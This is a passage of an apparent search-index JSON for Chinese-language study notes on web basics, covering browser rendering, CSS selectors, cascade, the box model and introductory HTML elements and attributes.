\u88ab\u89e3\u91ca\u3001\u7f16\u8bd1\u3001\u89e3\u6790\u548c\u6267\u884c\u3002Script \u88ab\u89e3\u6790\u4e3a \u62bd\u8c61\u8bed\u6cd5\u6811\u3002</li> <li>\u7b2c\u4e09\u6b65\uff1a\u6e32\u67d3\u6811\u3002\u5c06 DOM \u548c CSSOM \u7ec4\u5408\u6210\u4e00\u4e2a Render \u6811\uff0c\u8ba1\u7b97\u6837\u5f0f\u6811\u6216\u6e32\u67d3\u6811\u4ece DOM \u6811\u7684\u6839\u5f00\u59cb\u6784\u5efa\uff0c\u904d\u5386\u6bcf\u4e2a\u53ef\u89c1\u8282\u70b9\u3002</li> <li>\u7b2c\u56db\u6b65\uff1a\u5e03\u5c40\u3002\u5728\u6e32\u67d3\u6811\u4e0a\u8fd0\u884c\u5e03\u5c40\u4ee5\u8ba1\u7b97\u6bcf\u4e2a\u8282\u70b9\u7684\u51e0\u4f55\u4f53\u3002\u5e03\u5c40\u662f\u786e\u5b9a\u5448\u73b0\u6811\u4e2d\u6240\u6709\u8282\u70b9\u7684\u5bbd\u5ea6\u3001\u9ad8\u5ea6\u548c\u4f4d\u7f6e\uff0c\u4ee5\u53ca\u786e\u5b9a\u9875\u9762\u4e0a\u6bcf\u4e2a\u5bf9\u8c61\u7684\u5927\u5c0f\u548c\u4f4d\u7f6e\u7684\u8fc7\u7a0b\u3002\u56de\u6d41\u662f\u5bf9\u9875\u9762\u7684\u4efb\u4f55\u90e8\u5206\u6216\u6574\u4e2a\u6587\u6863\u7684\u4efb\u4f55\u540e\u7eed\u5927\u5c0f\u548c\u4f4d\u7f6e\u7684\u786e\u5b9a\u3002</li> <li>\u7b2c\u4e94\u6b65\uff1a\u7740\u8272\u3002\u7f51\u9875\u5c55\u793a\u5728\u5c4f\u5e55\u4e0a\u3002</li> </ul>"},{"location":"web/css/#css_3","title":"CSS \u89e3\u6790","text":"<p>\u5f53\u6d4f\u89c8\u5668\u9047\u5230\u65e0\u6cd5\u89e3\u6790\u7684 CSS \u65f6\uff0c\u4f1a\u76f4\u63a5\u5ffd\u7565\u6574\u4e2a\u9009\u62e9\u5668\u89c4\u5219\uff0c\u5e76\u7ee7\u7eed\u89e3\u6790\u4e0b\u4e00\u4e2a CSS \u9009\u62e9\u5668\u3002</p> <p>\u6b64\u5916\uff0cCSS \u548c HTML \u4e00\u6837\uff0c\u4f1a\u81ea\u52a8\u5c06\u591a\u4e2a\u7a7a\u767d\u7b26\u5408\u5e76\u4e3a\u4e00\u4e2a\u3002</p>"},{"location":"web/css/#css_4","title":"CSS \u5c42\u53e0\u3001\u4f18\u5148\u7ea7\u3001\u7ee7\u627f","text":"<p>\u53c2\u8003: \u5c42\u53e0\u4e0e\u7ee7\u627f - \u5b66\u4e60 Web \u5f00\u53d1 | MDN</p> <ul> <li>\u5c42\u53e0\uff1a\u7b80\u5355\u7684\u8bf4\uff0ccss \u89c4\u5219\u7684\u987a\u5e8f\u5f88\u91cd\u8981\uff0c\u5f53\u5e94\u7528\u4e24\u6761\u540c\u7ea7\u522b\u7684\u89c4\u5219\u5230\u4e00\u4e2a\u5143\u7d20\u7684\u65f6\u5019\uff0c\u5199\u5728\u540e\u9762\u7684\u5c31\u662f\u5b9e\u9645\u4f7f\u7528\u7684\u89c4\u5219\u3002</li> <li>\u4f18\u5148\u7ea7\uff1a<code>ID\u9009\u62e9\u5668&gt;\u7c7b\u3001\u4f2a\u7c7b\u3001\u5c5e\u6027\u9009\u62e9\u5668&gt;\u5143\u7d20\u3001\u4f2a\u5143\u7d20\u9009\u62e9\u5668</code> \u3002\u6d4f\u89c8\u5668\u662f\u6839\u636e\u4f18\u5148\u7ea7\u6765\u51b3\u5b9a\u5f53\u591a\u4e2a\u89c4\u5219\u6709\u4e0d\u540c\u9009\u62e9\u5668\u5bf9\u5e94\u76f8\u540c\u7684\u5143\u7d20\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528\u54ea\u4e2a\u89c4\u5219\uff0c\u6bd4\u5982\u7c7b\u9009\u62e9\u5668\u7684\u4f18\u5148\u7ea7\u5927\u4e8e\u5143\u7d20\u9009\u62e9\u5668\uff0c\u56e0\u6b64\u5373\u4fbf\u5143\u7d20\u9009\u62e9\u5668\u987a\u5e8f\u5728\u540e\u9762\uff0c\u4e5f\u4f1a\u5e94\u7528\u7c7b\u9009\u62e9\u5668\uff0c\u800c\u4e0d\u662f\u5143\u7d20\u9009\u62e9\u5668\u3002</li> <li>\u7ee7\u627f\uff1a\u4e00\u4e9b\u8bbe\u7f6e\u5728\u7236\u5143\u7d20\u4e0a\u7684 css \u5c5e\u6027\u662f\u53ef\u4ee5\u88ab\u5b50\u5143\u7d20\u7ee7\u627f\u7684\uff0c\u6709\u4e9b\u5219\u4e0d\u80fd\uff0c\u4e3e\u4e2a\u4f8b\u5b50\u5982\u679c\u4f60\u5728\u4e00\u4e2a\u5143\u7d20\u4e0a\u8bbe\u7f6e \u00a0width 50% \uff0c\u6240\u6709\u7684\u540e\u4ee3\u4e0d\u4f1a\u662f\u7236\u5143\u7d20\u7684\u5bbd\u5ea6\u7684 50% \u3002\u5982\u679c\u8fd9\u4e2a\u4e5f\u53ef\u4ee5\u7ee7\u627f\u7684\u8bdd\uff0cCSS \u5c31\u4f1a\u5f88\u96be\u4f7f\u7528\u4e86!</li> </ul>"},{"location":"web/css/#css_5","title":"CSS \u8bed\u6cd5","text":"<p>\u53c2\u8003: CSS \u53c2\u8003 - CSS\uff08\u5c42\u53e0\u6837\u5f0f\u8868\uff09 | MDN</p> <p>\u8bed\u6cd5\u7531\u4e00\u4e2a \u9009\u62e9\u5668(Selecter) \u5f00\u59cb\uff0c\u5b83\u9009\u62e9\u4e86\u5c06\u8981\u6dfb\u52a0\u6837\u5f0f\u7684 HTML \u5143\u7d20\u3002</p> <p>\u63a5\u7740\u8f93\u5165\u4e00\u5bf9 \u5927\u62ec\u53f7{}\uff0c\u5185\u90e8\u5b9a\u4e49\u4e00\u4e2a\u6216\u591a\u4e2a\u5f62\u5f0f\u4e3a <code>\u5c5e\u6027(property):\u503c(value)</code> \u7684 \u58f0\u660e(declarations)</p> <pre><code>h1 {\n  color: red;\n  font-size: 5em;\n}\n</code></pre>"},{"location":"web/css/#css_6","title":"CSS \u9009\u62e9\u5668","text":"<p>\u9009\u62e9\u5668\u5217\u8868\uff1a\u53ef\u4ee5\u7528 \u9017\u53f7 \u5206\u9694\u591a\u79cd\u9009\u62e9\u5668\uff0c\u5e94\u7528\u540c\u6837\u7684 css \u89c4\u5219\u3002</p> <pre><code>h1,\n.classValue,\na[title] {\n}\n</code></pre>"},{"location":"web/css/#id","title":"\u7c7b\u578b\u3001\u7c7b\u3001ID \u9009\u62e9\u5668","text":"<pre><code>h1 {\n}\n.classValue {\n}\n#idValue {\n}\n</code></pre>"},{"location":"web/css/#_1","title":"\u6807\u7b7e\u5c5e\u6027\u9009\u62e9\u5668","text":"<p>\u8fd9\u7ec4\u9009\u62e9\u5668\u6839\u636e\u4e00\u4e2a\u5143\u7d20\u4e0a\u7684\u67d0\u4e2a\u6807\u7b7e\u7684\u5c5e\u6027\u7684\u5b58\u5728\u4ee5\u9009\u62e9\u5143\u7d20\u7684\u4e0d\u540c\u65b9\u5f0f\uff1a</p> <pre><code>a[title] {\n}\n</code></pre> <p>\u6216\u8005\u6839\u636e\u4e00\u4e2a\u6709\u7279\u5b9a\u503c\u7684\u6807\u7b7e\u5c5e\u6027\u662f\u5426\u5b58\u5728\u6765\u9009\u62e9\uff1a</p> <pre><code>a[href=\"https://example.com\"]\n{\n}\n</code></pre>"},{"location":"web/css/#_2","title":"\u4f2a\u7c7b\u4e0e\u4f2a\u5143\u7d20\u9009\u62e9\u5668","text":"<p>\u8fd9\u7ec4\u9009\u62e9\u5668\u5305\u542b\u4e86\u4f2a\u7c7b\uff0c\u7528\u6765\u6837\u5f0f\u5316\u4e00\u4e2a\u5143\u7d20\u7684\u7279\u5b9a\u72b6\u6001\u3002\u4f8b\u5982<code>:hover</code>\u4f2a\u7c7b\u4f1a\u5728\u9f20\u6807\u6307\u9488\u60ac\u6d6e\u5230\u4e00\u4e2a\u5143\u7d20\u4e0a\u7684\u65f6\u5019\u9009\u62e9\u8fd9\u4e2a\u5143\u7d20\u3002</p> <pre><code>a:hover {\n}\n</code></pre> \u5c5e\u6027 \u63cf\u8ff0 :active \u5411\u88ab\u6fc0\u6d3b\u7684\u5143\u7d20\u6dfb\u52a0\u6837\u5f0f\u3002(\u5982 button \u88ab\u70b9\u51fb\uff09 :focus \u5411\u62e5\u6709\u952e\u76d8\u8f93\u5165\u7126\u70b9\u7684\u5143\u7d20\u6dfb\u52a0\u6837\u5f0f\u3002\uff08\u5982 input \u6b63\u5728\u8f93\u5165\u65f6\uff09 :hover \u5f53\u9f20\u6807\u60ac\u6d6e\u5728\u5143\u7d20\u4e0a\u65b9\u65f6\uff0c\u5411\u5143\u7d20\u6dfb\u52a0\u6837\u5f0f\u3002 :link \u5411\u672a\u88ab\u8bbf\u95ee\u7684\u94fe\u63a5\u6dfb\u52a0\u6837\u5f0f\u3002 :visited \u5411\u5df2\u88ab\u8bbf\u95ee\u7684\u94fe\u63a5\u6dfb\u52a0\u6837\u5f0f\u3002 :first-child \u5411\u5143\u7d20\u7684\u7b2c\u4e00\u4e2a\u5b50\u5143\u7d20\u6dfb\u52a0\u6837\u5f0f\u3002 :lang \u5411\u5e26\u6709\u6307\u5b9a lang \u5c5e\u6027\u7684\u5143\u7d20\u6dfb\u52a0\u6837\u5f0f\u3002 <p>\u5b83\u8fd8\u53ef\u4ee5\u5305\u542b\u4e86\u4f2a\u5143\u7d20\uff08\u5355\u3001\u53cc\u5f15\u53f7\u90fd\u53ef\uff09\uff0c\u9009\u62e9\u4e00\u4e2a\u5143\u7d20\u7684\u67d0\u4e2a\u90e8\u5206\u800c\u4e0d\u662f\u5143\u7d20\u81ea\u5df1\u3002</p> <pre><code>p::first-line {\n}\np:first-line {\n}\n</code></pre> \u5c5e\u6027 \u63cf\u8ff0 ::first-letter \u5c06\u7279\u6b8a\u6837\u5f0f\u6dfb\u52a0\u5230\u6587\u672c\u7684\u9996\u5b57\u6bcd ::first-line \u5c06\u7279\u6b8a\u6837\u5f0f\u6dfb\u52a0\u5230\u6587\u672c\u7684\u9996\u884c ::before \u5728\u67d0\u5143\u7d20\u4e4b\u524d\u63d2\u5165\u67d0\u4e9b\u5185\u5bb9 ::after \u5728\u67d0\u5143\u7d20\u4e4b\u540e\u63d2\u5165\u67d0\u4e9b\u5185\u5bb9\uff0c\u5982.help::after{content:\"?\"; } ::first-child \u5047\u8bbe div(\u65e0 class)\u4e0b\u6709\u4e09\u4e2a p\uff0c\u82e5\u8981\u4fee\u6539\u7b2c\u4e00\u4e2a p \u6807\u7b7e\uff0c\u5219 div p::first-child{} ::last-child \u540c first nth-child() \u5728\u62ec\u53f7\u5185\u8f93\u5165\u6570\u5b57\u5373\u53ef\u5b9e\u73b0\u63a7\u5236\u4fee\u6539\u7b2c n \u4e2a\u6807\u7b7e <p>Note</p> <p>\u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u7684\u9009\u62e9\u5668\uff0c\u5982\u540e\u4ee3\u9009\u62e9\u5668\u3001\u5b50\u4ee3\u9009\u62e9\u5668\u3001\u5e76\u96c6\u9009\u62e9\u5668\u7b49\uff0c\u6709\u5174\u8da3\u53ef\u81ea\u884c\u641c\u7d20\u5b66\u4e60\u3002</p>"},{"location":"web/css/#_3","title":"\u76d2\u6a21\u578b","text":"<p>\u5728 CSS \u4e2d\uff0c\u6240\u6709\u7684\u5143\u7d20\u90fd\u88ab\u4e00\u4e2a\u4e2a\u76d2\u5b50\u5305\u56f4\u7740\uff0c\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\uff1a</p>"},{"location":"web/css/#block-box","title":"\u5757\u7ea7\u76d2\u5b50(Block box)","text":"<ul> <li>\u6bcf\u4e2a\u76d2\u5b50\u90fd\u4f1a\u6362\u884c\u3002</li> <li><code>width</code> \u548c <code>height</code> \u5c5e\u6027\u53ef\u4ee5\u53d1\u6325\u4f5c\u7528\u3002</li> <li>\u5185\u8fb9\u8ddd\uff08padding\uff09, \u5916\u8fb9\u8ddd\uff08margin\uff09 \u548c \u8fb9\u6846\uff08border\uff09 \u4f1a\u5c06\u5176\u4ed6\u5143\u7d20\u4ece\u5f53\u524d\u76d2\u5b50\u5468\u56f4\u201c\u63a8\u5f00\u201d\u3002</li> <li>\u76d2\u5b50\u4f1a\u5728\u5185\u8054\u7684\u65b9\u5411\u4e0a\u6269\u5c55\u5e76\u5360\u636e\u7236\u5bb9\u5668\u5728\u8be5\u65b9\u5411\u4e0a\u7684\u6240\u6709\u53ef\u7528\u7a7a\u95f4\uff0c\u5728\u7edd\u5927\u6570\u60c5\u51b5\u4e0b\u610f\u5473\u7740\u76d2\u5b50\u4f1a\u548c\u7236\u5bb9\u5668\u4e00\u6837\u5bbd\u3002</li> </ul>"},{"location":"web/css/#inline-box","title":"\u5185\u8054\u76d2\u5b50(Inline box)","text":"<ul> <li>\u76d2\u5b50\u4e0d\u4f1a\u4ea7\u751f\u6362\u884c\u3002</li> <li><code>width</code> \u548c <code>height</code> \u5c5e\u6027\u90fd\u5c06\u4e0d\u8d77\u4f5c\u7528</li> <li>\u5782\u76f4\u65b9\u5411 \u7684 padding\u3001margin\u3001border \u4f1a\u88ab\u5e94\u7528\u4f46\u662f <code>\u4e0d\u4f1a</code> \u628a\u5176\u4ed6\u5904\u4e8e \u00a0<code>inline</code>\u00a0 \u72b6\u6001\u7684\u76d2\u5b50\u63a8\u5f00\u3002</li> <li>\u6c34\u5e73\u65b9\u5411 \u7684 padding\u3001margin\u3001border \u4f1a\u88ab\u5e94\u7528\u4e14 <code>\u4f1a</code> \u628a\u5176\u4ed6\u5904\u4e8e \u00a0<code>inline</code>\u00a0 \u72b6\u6001\u7684\u76d2\u5b50\u63a8\u5f00\u3002</li> </ul> <p>Note</p> <p>HTML\u4e2d\u5143\u7d20\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\uff1a</p> <ul> <li>\u5757\u7ea7\u5143\u7d20\uff0c\u5728\u9875\u9762\u4e2d\u4ee5\u5757\u7684\u5f62\u5f0f\u5c55\u73b0\u3002\u76f8\u5bf9\u4e8e\u5176\u524d\u9762\u7684\u5185\u5bb9\u5b83\u4f1a\u51fa\u73b0\u5728**\u65b0\u7684\u4e00\u884c**\uff0c\u5176\u540e\u7684\u5185\u5bb9\u4e5f\u4f1a\u88ab\u6324\u5230\u4e0b\u4e00\u884c\u5c55\u73b0\u3002\u5757\u7ea7\u5143\u7d20\u4e0d\u4f1a\u88ab\u5d4c\u5957\u8fdb\u5185\u8054\u5143\u7d20\u4e2d\uff0c\u4f46\u53ef\u4ee5\u5d4c\u5957\u5728\u5176\u4ed6\u5757\u7ea7\u5143\u7d20\u4e2d\u3002\u4e3b\u8981\u7528\u4e8e\u5c55\u793a\u7ed3\u6784\u5316\u7684\u5185\u5bb9\uff0c\u5982\u6bb5\u843d\u3001\u5217\u8868\u3001\u5bfc\u822a\u83dc\u5355\u3001\u9875\u811a\u7b49\u3002</li> <li>\u5185\u8054\u5143\u7d20\uff0c\u901a\u5e38\u51fa\u73b0\u5728\u5757\u7ea7\u5143\u7d20\u4e2d\uff0c\u4e0d\u4f1a\u5bfc\u81f4\u6587\u672c\u6362\u884c\u3002</li> </ul> <p>\u56e0\u6b64\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cHTML\u4e2d\u7684\u5757\u7ea7\u5143\u7d20\uff0c\u5728CSS\u4e2d\u4f1a\u662f\u5757\u7ea7\u76d2\u5b50\u3002\u4f46\u53ef\u4ee5\u901a\u8fc7\u5bf9\u76d2\u5b50 <code>display</code>\u00a0\u5c5e\u6027\u7684\u8bbe\u7f6e\uff0c\u6bd4\u5982\u00a0<code>inline</code>\u00a0\u6216\u8005\u00a0<code>block</code>\u00a0\uff0c\u6765\u63a7\u5236\u76d2\u5b50\u7684 \u5916\u90e8\u663e\u793a\u7c7b\u578b\u3002</p>"},{"location":"web/css/#_4","title":"\u76d2\u6a21\u578b\u7684\u5185\u90e8\u548c\u5916\u90e8\u663e\u793a\u7c7b\u578b","text":"<p>\u5982\u4e0a\u6240\u8ff0\uff0c css \u7684 box \u6a21\u578b\u6709\u4e00\u4e2a \u5916\u90e8\u663e\u793a\u7c7b\u578b\uff0c\u6765\u51b3\u5b9a\u8be5\u5143\u7d20\u5bf9\u5e94\u7684\u76d2\u5b50\u662f\u5757\u7ea7\u8fd8\u662f\u5185\u8054\u3002</p> <p>\u540c\u6837\u76d2\u6a21\u578b\u8fd8\u6709 \u5185\u90e8\u663e\u793a\u7c7b\u578b\uff0c\u5b83\u51b3\u5b9a\u4e86\u76d2\u5b50\u5185\u90e8\u5143\u7d20\u662f\u5982\u4f55\u5e03\u5c40\u7684\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u548c\u5916\u90e8\u663e\u793a\u7c7b\u578b\u76f8\u540c\uff0c\u90fd\u548c HTML \u5143\u7d20\u7c7b\u578b\u76f8\u540c\u3002</p> <ul> <li>\u5916\u90e8\u663e\u793a\u7c7b\u578b\uff1a\u66f4\u6539\u76d2\u5b50 <code>display</code> \u5c5e\u6027\u7684\u8bbe\u7f6e\uff0c\u6bd4\u5982 <code>inline</code> \u6216\u8005 <code>block</code> \uff0c\u5373\u53ef\u5b9e\u73b0\u66f4\u6539\u3002</li> <li>\u5185\u90e8\u663e\u793a\u7c7b\u578b\uff1adisplay\uff1aflex\uff0c\u6b64\u65f6\u5c06\u5185\u90e8\u663e\u793a\u7c7b\u578b\u4fee\u6539\u4e3a <code>flex</code> \u3002</li> </ul>"},{"location":"web/css/#_5","title":"\u76d2\u6a21\u578b\u7684\u5404\u4e2a\u90e8\u5206","text":"<p>CSS \u4e2d\u7ec4\u6210\u4e00\u4e2a\u5757\u7ea7\u76d2\u5b50\u9700\u8981:</p> <ul> <li>Content box: \u8fd9\u4e2a\u533a\u57df\u662f\u7528\u6765\u663e\u793a\u5185\u5bb9\uff0c\u5927\u5c0f\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e <code>width</code> \u548c <code>height</code>.</li> <li>Padding box: \u5305\u56f4\u5728\u5185\u5bb9\u533a\u57df\u5916\u90e8\u7684\u7a7a\u767d\u533a\u57df\uff1b \u5927\u5c0f\u901a\u8fc7 <code>padding</code> \u76f8\u5173\u5c5e\u6027\u8bbe\u7f6e\u3002</li> <li>Border box: \u8fb9\u6846\u76d2\u5305\u88f9\u5185\u5bb9\u548c\u5185\u8fb9\u8ddd\u3002\u5927\u5c0f\u901a\u8fc7 <code>border</code> \u76f8\u5173\u5c5e\u6027\u8bbe\u7f6e\u3002</li> <li>Margin box: \u8fd9\u662f\u6700\u5916\u9762\u7684\u533a\u57df\uff0c\u662f\u76d2\u5b50\u548c\u5176\u4ed6\u5143\u7d20\u4e4b\u95f4\u7684\u7a7a\u767d\u533a\u57df\u3002\u5927\u5c0f\u901a\u8fc7 <code>margin&gt;</code> \u76f8\u5173\u5c5e\u6027\u8bbe\u7f6e\u3002</li> </ul> <p></p>"},{"location":"web/css/#css_7","title":"CSS \u5e03\u5c40","text":"<p>\u6392\u7248\u7684\u51e0\u79cd\u65b9\u6cd5\uff1a</p> <ul> <li>position</li> <li>float</li> <li>flex</li> <li>grid</li> </ul>"},{"location":"web/html/","title":"HTML","text":""},{"location":"web/html/#_1","title":"\u5feb\u901f\u4f7f\u7528","text":"<p>\u5728 vscode \u4e2d\u8f93\u5165 html:5\uff0c\u56de\u8f66\u540e\u5373\u53ef\u751f\u6210\u57fa\u7840\u5185\u5bb9\uff08\u5305\u542b head\u3001\u7a7a body)\u3002</p> <p></p>"},{"location":"web/html/#html_1","title":"\u4ec0\u4e48\u662f HTML","text":"<p>HTML(HyperText Markup Language) \u4e0d\u662f\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00\uff0c\u800c\u662f\u4e00\u79cd\u7528\u6765\u544a\u77e5\u6d4f\u89c8\u5668\u5982\u4f55\u7ec4\u7ec7\u9875\u9762\u7684 \u6807\u8bb0\u8bed\u8a00\u3002\u7531\u4e00\u7cfb\u5217\u7684 \u5143\u7d20\uff08elements\uff09 \u7ec4\u6210\uff0c\u8fd9\u4e9b\u5143\u7d20\u53ef\u4ee5\u7528\u6765\u5305\u56f4\u4e0d\u540c\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u4f7f\u5176\u4ee5\u67d0\u79cd\u65b9\u5f0f\u5448\u73b0\u6216\u8005\u5de5\u4f5c\u3002</p> <p>\u4e00\u5bf9\u6807\u7b7e\uff08\u00a0tags\uff09\u53ef\u4ee5\u4e3a\u4e00\u6bb5\u6587\u5b57\u6216\u8005\u4e00\u5f20\u56fe\u7247\u6dfb\u52a0\u8d85\u94fe\u63a5\uff0c\u5c06\u6587\u5b57\u8bbe\u7f6e\u4e3a\u659c\u4f53\u3001\u6539\u53d8\u5b57\u53f7\u7b49</p> <p>Note</p> <p>HTML\u6807\u7b7e\u4e0d\u533a\u5206\u5927\u5c0f\u3002\u5373 <code>&lt;title&gt;</code> <code>&lt;TITLE&gt;</code> <code>&lt;Title&gt;</code> \u7b49\u6548</p>"},{"location":"web/html/#_2","title":"\u5f15\u53f7\u98ce\u683c","text":"<p>\u4e0d\u7ed9\u5c5e\u6027\u503c\u52a0\u5f15\u53f7\uff0c\u6709\u65f6\u662f\u53ef\u884c\u7684\uff0c\u4f46\u662f\u5f53\u4e00\u4e2a\u5143\u7d20\u6709\u591a\u4e2a\u5c5e\u6027\u65f6\uff0c\u5c31\u4f1a\u62a5\u9519\u3002\u56e0\u6b64\u6211\u4eec\u59cb\u7ec8\u5e94\u8be5\u6dfb\u52a0\u5f15\u53f7\u3002</p> <p>\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\uff0c\u4e8c\u8005\u90fd\u53ef\u4ee5\u4f7f\u7528\uff0c\u53ea\u662f\u98ce\u683c\u95ee\u9898\u3002</p> <p>\u5355\u53cc\u5f15\u53f7\u4e0d\u53ef\u4ee5\u6df7\u7528</p>"},{"location":"web/html/#_3","title":"\u6ce8\u91ca","text":"<pre><code>&lt;!-- This is a comment --&gt;\n</code></pre>"},{"location":"web/html/#html_2","title":"HTML \u7a7a\u767d","text":"<p>\u65e0\u8bba\u4f60\u5728 HTML \u5143\u7d20\u7684\u5185\u5bb9\u4e2d\u4f7f\u7528\u591a\u5c11\u7a7a\u683c\uff08\u7a7a\u767d\u7b26\u53f7\u3001\u6362\u884c\uff09\uff0c\u5f53\u6e32\u67d3\u8fd9\u4e9b\u4ee3\u7801\u7684\u65f6\u5019\uff0cHTML \u89e3\u91ca\u5668\u90fd\u4f1a\u5c06\u8fde\u7eed\u51fa\u73b0\u7684\u7a7a\u767d\u5b57\u7b26\u51cf\u5c11\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684\u7a7a\u683c\u7b26\u3002</p> <pre><code>&lt;h1&gt;\u6211\u7684 Web \n        \u9875\u9762&lt;/h1&gt;\n&lt;h1&gt;\u6211\u7684 Web \u9875\u9762&lt;/h1&gt;\n</code></pre>"},{"location":"web/html/#_4","title":"\u5b9e\u4f53\u5f15\u7528","text":"<p>\u5728 HTML \u4e2d\uff0c\u5b57\u7b26 <code>&lt;</code> <code>&gt;</code> <code>\"</code> <code>'</code> <code>&amp;</code> \u662f\u7279\u6b8a\u5b57\u7b26\u3002\u5b83\u4eec\u662f HTML \u8bed\u6cd5\u81ea\u8eab\u7684\u4e00\u90e8\u5206\uff0c\u5982\u4f55\u663e\u793a\u4ed6\u4eec\u5462\uff1f</p> <p>\u4f7f\u7528\u5b57\u7b26\u5f15\u7528\uff1a</p> \u539f\u4e49\u5b57\u7b26 \u7b49\u4ef7\u5b57\u7b26\u5f15\u7528 &lt; <code>&amp;lt;</code> &gt; <code>&amp;gt;</code> \" <code>&amp;quot;</code> ' <code>&amp;apos;</code> &amp; <code>&amp;amp;</code>"},{"location":"web/html/#html_3","title":"HTML \u5143\u7d20","text":"<p>\u5982\u4e0b\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u6bb5\u843d\u5143\u7d20\uff1a</p> <p></p> <p>\u8be5\u5143\u7d20\u7684\u4e3b\u8981\u90e8\u5206\u6709\uff1a</p> <ul> <li>\u5f00\u59cb\u6807\u7b7e</li> <li>\u7ed3\u675f\u6807\u7b7e</li> <li>\u5185\u5bb9</li> </ul> <p>\u4e09\u8005\u5171\u540c\u7ec4\u6210\u4e86\u4e00\u4e2a\u5143\u7d20\u3002</p> <p>\u5f53\u7136\uff0c\u4e0d\u662f\u6240\u6709\u7684\u5143\u7d20\u90fd\u62e5\u6709\u4ee5\u4e0a\u4e09\u4e2a\u90e8\u5206\uff0c\u6709\u4e9b\u5143\u7d20\u53ea\u6709\u4e00\u4e2a\u6807\u7b7e\uff0c\u901a\u5e38\u7528\u6765\u5728\u6b64\u5143\u7d20\u6240\u5728\u4f4d\u7f6e\u63d2\u5165/\u5d4c\u5165\u4e00\u4e9b\u4e1c\u897f\uff0c\u79f0\u4e3a\u7a7a\u5143\u7d20(Empty elements, void elements)</p> <p>\u4f8b\u5982\uff1a\u5143\u7d20 <code>&lt;img&gt;</code> \u662f\u7528\u6765\u5728\u5b83\u6240\u5728\u7684\u4f4d\u7f6e\u63d2\u5165\u4e00\u5f20\u6307\u5b9a\u7684\u56fe\u7247\u3002</p> <pre><code>&lt;img src=\"/path/to/pic.png\" /&gt;\n</code></pre> <p>\u6b64\u5916\uff0c\u5143\u7d20\u8fd8\u53ef\u4ee5\u62e5\u6709 \u5c5e\u6027\uff1a</p> <p></p> <p>\u5c5e\u6027\u5305\u542b\u5143\u7d20\u7684\u989d\u5916\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u4e0d\u4f1a\u51fa\u73b0\u5728\u5b9e\u9645\u7684\u5185\u5bb9\u4e2d\u3002\u5982\u4e0a\u56fe\uff0c\u8be5 class \u5c5e\u6027\u7ed9\u5143\u7d20\u8d4b\u4e88\u4e86\u4e00\u4e2a\u8bc6\u522b\u7684\u540d\u5b57\u3002</p> <p>\u4e00\u4e2a\u5c5e\u6027\u5fc5\u987b\u5305\u542b\u5982\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li>\u4e00\u4e2a\u7a7a\u683c\uff0c\u5728\u5c5e\u6027\u548c\u5143\u7d20\u540d\u8bcd\u4e4b\u95f4\uff0c\u82e5\u591a\u4e2a\u5c5e\u6027\uff0c\u5219\u5f7c\u6b64\u4e4b\u95f4\u4e5f\u5e94\u6709\u7a7a\u683c\u3002</li> <li>\u5c5e\u6027\u540d\u79f0\uff0c\u540e\u9762\u8ddf\u968f\u4e00\u4e2a <code>\u7b49\u53f7=</code></li> <li>\u5c5e\u6027\u503c\uff0c\u7531\u4e00\u5bf9 <code>\u5f15\u53f7\u201d\u201d</code> \u5305\u88f9</li> </ul> <p>\u4f8b\u5982 <code>&lt;a&gt;</code> \u5143\u7d20\u53ef\u4ee5\u6dfb\u52a0\u5927\u91cf\u5c5e\u6027\uff0c\u4f8b\u5982\uff1a</p> <pre><code>&lt;a href=\"https://leqing.online.com/\" title=\"\u4e50\u4e50\u535a\u5ba2\" target=\"_blank\"\n  &gt;click to block&lt;/a\n&gt;\n</code></pre> <ul> <li>href\uff1a\u58f0\u660e\u8d85\u94fe\u63a5\u7684 web \u5730\u5740\uff0c\u88ab\u70b9\u51fb\u540e\u8df3\u8f6c\u5230\u6539\u5730\u5740</li> <li>title\uff1a\u5f53\u9f20\u6807\u60ac\u505c\u5728\u8d85\u94fe\u63a5\u4e0a\u65f6\uff0c\u4f1a\u63d0\u793a title \u7684\u5185\u5bb9</li> <li>target\uff1a\u94fe\u63a5\u5982\u4f55\u5448\u73b0\uff0c <code>target=\"_blank\"</code> \u5c06\u5728\u65b0\u6807\u7b7e\u4e2d\u663e\u793a\u3002\u5426\u5219\u5c06\u5728\u5f53\u524d\u9875\u9762\u663e\u793a\u3002</li> </ul> <p>\u5e03\u5c14\u5c5e\u6027\uff1a\u6ca1\u6709\u503c\u7684\u5c5e\u6027\u3002\u4ed6\u4eec\u7684\u5c5e\u6027\u503c\u5c31\u662f\u5c5e\u6027\u540d\uff0c\u56e0\u6b64\u53ef\u4ee5\u7701\u7565\u3002</p> <pre><code>&lt;!-- \u4f7f\u7528disabled\u5c5e\u6027\u6765\u9632\u6b62\u7ec8\u7aef\u7528\u6237\u8f93\u5165\u6587\u672c\u5230\u8f93\u5165\u6846\u4e2d --&gt;\n&lt;input type=\"text\" disabled=\"disabled\" /&gt;\n&lt;input type=\"text\" disabled /&gt;\n</code></pre> <p>\u5143\u7d20\u53ef\u4ee5 \u5d4c\u5957\uff1a</p> <pre><code>&lt;p&gt;\u6211\u7684\u732b\u54aa\u813e\u6c14&lt;strong&gt;\u66b4\u8e81&lt;/strong&gt;&lt;/p&gt;\n</code></pre> <p>HTML \u4e2d\u5143\u7d20\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\uff1a</p> <ul> <li>\u5757\u7ea7\u5143\u7d20\uff0c\u5728\u9875\u9762\u4e2d\u4ee5\u5757\u7684\u5f62\u5f0f\u5c55\u73b0\u3002\u76f8\u5bf9\u4e8e\u5176\u524d\u9762\u7684\u5185\u5bb9\u5b83\u4f1a\u51fa\u73b0\u5728 